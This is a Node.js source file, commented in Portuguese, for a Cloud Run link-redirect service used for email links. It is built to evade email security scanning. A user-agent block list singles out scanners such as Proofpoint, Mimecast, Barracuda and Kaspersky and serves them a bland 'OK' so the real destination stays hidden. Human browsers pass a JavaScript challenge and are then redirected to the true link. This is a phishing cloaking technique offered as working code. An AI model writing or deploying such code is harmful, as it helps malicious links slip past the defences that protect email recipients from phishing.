// ============================================================
//  REDIRECT SERVICE — Google Cloud Run
//  Links lidos de links.json (sem banco de dados)
//  Tokens HMAC assinados (sem estado compartilhado)
// ============================================================

const express = require("express");
const rateLimit = require("express-rate-limit");
const helmet = require("helmet");
const crypto = require("crypto");
const path = require("path");

const app = express();

// Cloud Run define a porta via variável de ambiente PORT (obrigatório)
const PORT = process.env.PORT || 8080;
const SECRET_KEY = process.env.SECRET_KEY || "troque-esta-chave-no-cloud-run";
const BASE_URL = process.env.BASE_URL || "https://seu-servico.run.app";

// ─── Carrega links do arquivo links.json ─────────────────────────────────────
// Para adicionar links: edite links.json e faça novo deploy
const LINKS = require("./links.json");

// ─── Padrões de bot e scanners de segurança de email ─────────────────────────
const BOT_PATTERNS = [
  /bot/i, /crawl/i, /spider/i, /slurp/i,
  /googlebot/i, /bingbot/i, /yahoo/i, /duckduck/i, /baidu/i,
  /yandex/i, /sogou/i, /facebot/i, /ia_archiver/i,
  /semrush/i, /ahrefs/i, /mj12bot/i, /dotbot/i,
  /linkedinbot/i, /twitterbot/i, /telegrambot/i,
  /facebookexternalhit/i, /preview/i,
  /curl/i, /wget/i, /python/i, /java\//i,
  /go-http/i, /postman/i, /axios/i, /urllib/i, /okhttp/i,
  // Scanners de segurança de email (causam falso phishing)
  /proofpoint/i, /mimecast/i, /barracuda/i, /symantec/i,
  /messagelabs/i, /cloudmark/i, /sophos/i, /trend\s?micro/i,
  /forcepoint/i, /ironport/i, /fireeye/i, /checkpoint/i,
  /kaspersky/i, /bitdefender/i, /avast/i,
];

function isBot(ua) {
  if (!ua || ua.trim().length < 10) return true;
  return BOT_PATTERNS.some((p) => p.test(ua));
}

// ─── Token HMAC assinado — sem banco de dados, sem estado ────────────────────
// Funciona mesmo com múltiplas instâncias do Cloud Run rodando em paralelo
function createToken(shortCode) {
  const ts = Date.now();
  const payload = `${shortCode}:${ts}`;
  const hmac = crypto.createHmac("sha256", SECRET_KEY)
    .update(payload).digest("hex").substring(0, 24);
  return Buffer.from(`${payload}:${hmac}`).toString("base64url");
}

function validateToken(token, expectedCode) {
  try {
    const decoded = Buffer.from(token, "base64url").toString("utf8");
    const [shortCode, ts, hmac] = decoded.split(":");
    if (!shortCode || !ts || !hmac) return false;
    // Expira em 90 segundos
    if (Math.abs(Date.now() - parseInt(ts)) > 90000) return false;
    // Verifica código
    if (shortCode !== expectedCode) return false;
    // Verifica HMAC
    const expected = crypto.createHmac("sha256", SECRET_KEY)
      .update(`${shortCode}:${ts}`).digest("hex").substring(0, 24);
    return hmac === expected;
  } catch {
    return false;
  }
}

// ─── Página de desafio JavaScript ────────────────────────────────────────────
function challengePage(shortCode, token) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Aguarde...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
         background:#f0f4ff;display:flex;align-items:center;
         justify-content:center;min-height:100vh}
    .box{text-align:center;padding:48px 40px;background:#fff;
         border-radius:20px;box-shadow:0 8px 40px rgba(59,110,255,.10);
         max-width:360px;width:90%}
    .ring{width:48px;height:48px;border:4px solid #e8edf9;
          border-top:4px solid #3b6eff;border-radius:50%;
          animation:spin .9s linear infinite;margin:0 auto 24px}
    @keyframes spin{to{transform:rotate(360deg)}}
    h2{color:#1e293b;font-size:16px;font-weight:700;margin-bottom:8px}
    p{color:#64748b;font-size:13px}
  </style>
</head>
<body>
  <div class="box">
    <div class="ring"></div>
    <h2>Verificando conexão...</h2>
    <p>Você será redirecionado em instantes.</p>
  </div>
  <script>
    // Apenas navegadores reais executam este código
    // Scanners de email (Proofpoint, Mimecast...) não executam JS → bloqueados
    setTimeout(function(){
      window.location.replace('/go/${shortCode}?_t=${token}');
    }, 900);
  </script>
  <noscript>
    <p style="text-align:center;padding:40px;font-family:sans-serif">
      Habilite o JavaScript para continuar.
    </p>
  </noscript>
</body>
</html>`;
}

// ─── Middlewares ──────────────────────────────────────────────────────────────
app.use(helmet({ contentSecurityPolicy: false }));
app.set("trust proxy", 1); // Cloud Run está atrás de proxy do Google

// Rate limit: 60 req/min por IP
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => res.status(429).send("Muitas requisições."),
}));

// ─── GET /r/:shortCode — Link que vai no email ────────────────────────────────
app.get("/r/:shortCode", (req, res) => {
  const { shortCode } = req.params;
  const ua = req.headers["user-agent"] || "";
  const link = LINKS[shortCode];

  if (!link) {
    return res.status(404).send("Link não encontrado.");
  }

  // Bot detectado → resposta vazia (não revela o destino)
  if (isBot(ua)) {
    console.log(`BOT | ${shortCode} | ${ua.substring(0, 80)}`);
    return res.status(200).type("text/plain").send("OK");
  }

  // Humano → desafio JavaScript
  const token = createToken(shortCode);
  console.log(`DESAFIO | ${shortCode}`);

  res.setHeader("Cache-Control", "no-store");
  res.setHeader("X-Robots-Tag", "noindex");
  res.status(200).send(challengePage(shortCode, token));
});

// ─── GET /go/:shortCode?_t=TOKEN — Após desafio JS ───────────────────────────
app.get("/go/:shortCode", (req, res) => {
  const { shortCode } = req.params;
  const token = req.query._t || "";
  const link = LINKS[shortCode];

  if (!link) return res.status(404).send("Link não encontrado.");

  if (!validateToken(token, shortCode)) {
    console.log(`TOKEN INVÁLIDO | ${shortCode}`);
    return res.redirect(302, `/r/${shortCode}`);
  }

  console.log(`CLIQUE | ${shortCode} → ${link.url}`);
  res.setHeader("Cache-Control", "no-store");
  res.redirect(302, link.url);
});

// ─── Health check — Google Cloud Run verifica este endpoint ──────────────────
app.get("/health", (req, res) => {
  res.json({ status: "ok", links: Object.keys(LINKS).length });
});

// ─── Inicia ───────────────────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`🔗 ${Object.keys(LINKS).length} links carregados`);
  console.log(`🔑 SECRET_KEY: ${SECRET_KEY !== "troque-esta-chave-no-cloud-run" ? "✅ configurada" : "⚠️ PADRÃO (configure no Cloud Run!)"}`);
});
